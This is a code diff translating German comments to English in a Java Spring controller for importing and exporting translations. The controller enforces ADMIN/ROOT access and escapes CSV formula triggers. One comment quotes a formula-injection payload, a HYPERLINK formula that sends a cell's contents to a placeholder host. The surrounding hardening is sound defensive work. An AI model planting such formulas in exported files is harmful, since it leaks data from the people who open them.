@@ -38,17 +38,17 @@ import java.util.Set;
  *   <li>POST /api/i18n/import - import translations from CSV upload</li>
  * </ul>
  *
- * <p><b>SECURITY (Karte 304):</b> Beide Endpunkte sind ausschliesslich fuer ADMIN/ROOT gedacht.
- * Uebersetzungen sind <em>global</em> (die Entity {@code I18nTranslation} hat keine
- * {@code mandat}-Spalte) und landen auf Admin-Seiten wie {@code useradmin.xhtml} — ein
- * beliebiger {@code ROLE_USER} durfte sie vorher ueberschreiben (Stored XSS im Admin-Kontext)
- * bzw. komplett exportieren.
- * <p>Die primaere Absicherung ist der Pfad-Matcher
- * {@code /api/i18n/** -> hasAnyRole("ADMIN","ROOT")} in {@code PlaintextSecurityConfig}. Der
- * Check hier ist die zweite Verteidigungslinie fuer den Fall, dass eine konsumierende App die
- * Filter-Chain-Regel verliert (z.B. ueber ein zu weites {@code permitAllPatterns}).
- * {@code @PreAuthorize} ist bewusst NICHT verwendet: im Framework ist nirgends
- * {@code @EnableMethodSecurity} aktiv, die Annotation waere eine stille Attrappe.
+ * <p><b>SECURITY (card 304):</b> both endpoints are meant exclusively for ADMIN/ROOT.
+ * Translations are <em>global</em> (the entity {@code I18nTranslation} has no
+ * {@code mandat} column) and end up on admin pages such as {@code useradmin.xhtml} — any
+ * {@code ROLE_USER} was previously allowed to overwrite them (stored XSS in the admin context)
+ * or to export them in full.
+ * <p>The primary safeguard is the path matcher
+ * {@code /api/i18n/** -> hasAnyRole("ADMIN","ROOT")} in {@code PlaintextSecurityConfig}. The
+ * check here is the second line of defence, for the case that a consuming application loses the
+ * filter chain rule (e.g. through an overly broad {@code permitAllPatterns}).
+ * {@code @PreAuthorize} is deliberately NOT used: {@code @EnableMethodSecurity} is not active
+ * anywhere in the framework, so the annotation would be a silent dummy.
  */
 @RestController
 @RequestMapping("/api/i18n")
@@ -58,7 +58,7 @@ public class I18nExportController {
     private static final String CSV_SEPARATOR = ";";
     private static final String CSV_HEADER = "defaultLabel;languageCode;translatedText";
 
-    /** Rollen, die Uebersetzungen lesen/schreiben duerfen (Authorities sind {@code ROLE_<UPPERCASE>}). */
+    /** Roles allowed to read/write translations (authorities are {@code ROLE_<UPPERCASE>}). */
     private static final Set<String> ERLAUBTE_AUTHORITIES = Set.of("ROLE_ADMIN", "ROLE_ROOT");
 
     private final I18nService i18nService;
@@ -68,23 +68,23 @@ public class I18nExportController {
     }
 
     /**
-     * Zweite Verteidigungslinie: prueft die Rolle programmatisch am SecurityContext.
+     * Second line of defence: checks the role programmatically against the SecurityContext.
      *
-     * @return true, wenn der aktuelle Principal ADMIN oder ROOT ist
+     * @return true when the current principal is ADMIN or ROOT
      */
     private boolean istBerechtigt() {
         Authentication auth = SecurityContextHolder.getContext().getAuthentication();
         if (auth == null || !auth.isAuthenticated()) {
             return false;
         }
-        // AnonymousAuthenticationToken ist "authenticated", traegt aber nur ROLE_ANONYMOUS
-        // und faellt damit durch die Authority-Pruefung.
+        // AnonymousAuthenticationToken is "authenticated" but carries only ROLE_ANONYMOUS
+        // and therefore fails the authority check.
         return auth.getAuthorities().stream()
                 .map(GrantedAuthority::getAuthority)
                 .anyMatch(ERLAUBTE_AUTHORITIES::contains);
     }
 
-    /** Loggt die Ablehnung und liefert 403. */
+    /** Logs the rejection and returns 403. */
     private <T> ResponseEntity<T> verweigert(String endpunkt) {
         Authentication auth = SecurityContextHolder.getContext().getAuthentication();
         log.warn("SECURITY: Zugriff auf {} ohne ADMIN/ROOT-Rolle abgelehnt (user={})",
@@ -232,21 +232,21 @@ public class I18nExportController {
     }
 
     /**
-     * SECURITY (Karte 314, Punkt 15): Zeichen, mit denen Excel/LibreOffice/Google Sheets eine
-     * Zelle als FORMEL interpretieren. Ein Uebersetzungstext wie
-     * {@code =HYPERLINK("https://example.invalid/?"&A1,"Klick")} landet ueber den Export in der
-     * Tabelle des Empfaengers und wird dort beim Oeffnen ausgefuehrt (CSV-/Formula-Injection).
+     * SECURITY (card 314, item 15): characters that make Excel/LibreOffice/Google Sheets interpret
+     * a cell as a FORMULA. A translation text such as
+     * {@code =HYPERLINK("https://example.invalid/?"&A1,"Klick")} reaches the recipient's
+     * spreadsheet through the export and is executed there when it is opened (CSV/formula injection).
      */
     private static final String CSV_FORMULA_TRIGGERS = "=+-@\t\r";
 
     /**
      * Escape a value for CSV output. Wraps in quotes if it contains the separator, quotes, or newlines.
      *
-     * <p>SECURITY (Karte 314, Punkt 15): fuehrende Formel-Trigger werden zusaetzlich mit einem
-     * einfachen Anfuehrungszeichen neutralisiert. Das ist die von OWASP empfohlene Variante: der
-     * Wert bleibt in der Tabelle lesbar, wird aber garantiert als Text behandelt. Der Re-Import
-     * ueber {@link #unescapeCsv(String)} entfernt das Zeichen wieder, damit Export -> Import
-     * verlustfrei bleibt.
+     * <p>SECURITY (card 314, item 15): leading formula triggers are additionally neutralised with a
+     * single quote. This is the variant recommended by OWASP: the
+     * value stays readable in the spreadsheet but is guaranteed to be treated as text. The re-import
+     * through {@link #unescapeCsv(String)} removes the character again, so that export -> import
+     * stays lossless.
      */
     private String escapeCsv(String value) {
         if (value == null) {
@@ -265,13 +265,13 @@ public class I18nExportController {
     /**
      * Unescape a CSV value (remove surrounding quotes, unescape doubled quotes).
      *
-     * <p>SECURITY (Karte 314, Punkt 15): entfernt zusaetzlich das beim Export vorangestellte
-     * Schutz-Apostroph wieder, damit ein Export -> Import-Zyklus den Originaltext
-     * wiederherstellt und nicht bei jedem Durchlauf ein weiteres Apostroph anwaechst.
+     * <p>SECURITY (card 314, item 15): additionally removes the protective apostrophe that the export
+     * prepends, so that an export -> import cycle restores the original text
+     * instead of growing another apostrophe on every pass.
      */
     private String unescapeCsv(String value) {
-        // Dieselbe Regel liest auch der Seed-Importer (Welle 2, 29.08.2026): ein Export laesst sich
-        // unveraendert als src/main/resources/i18n/*.csv einchecken.
+        // The seed importer reads by the same rule (wave 2, 29.08.2026): an export can be checked in
+        // unchanged as src/main/resources/i18n/*.csv.
         return I18nSeedLinter.unescape(value);
     }
 
